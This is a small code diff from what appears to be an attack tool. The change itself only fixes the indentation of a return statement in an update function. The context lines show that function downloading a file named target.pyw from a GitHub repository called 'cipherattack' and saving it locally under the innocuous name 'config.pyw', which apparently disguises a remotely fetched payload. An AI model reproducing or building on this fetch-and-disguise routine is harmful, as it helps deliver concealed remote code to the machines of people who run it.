@@ -52,7 +52,7 @@ def update1():
     with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/target.pyw") as conf:
         with open("config.pyw","wb") as config:
             config.write(conf.read())
-   return
+    return
 
 if not os.path.isfile("availability.dat"):
     with open("availability.dat","wb") as f:
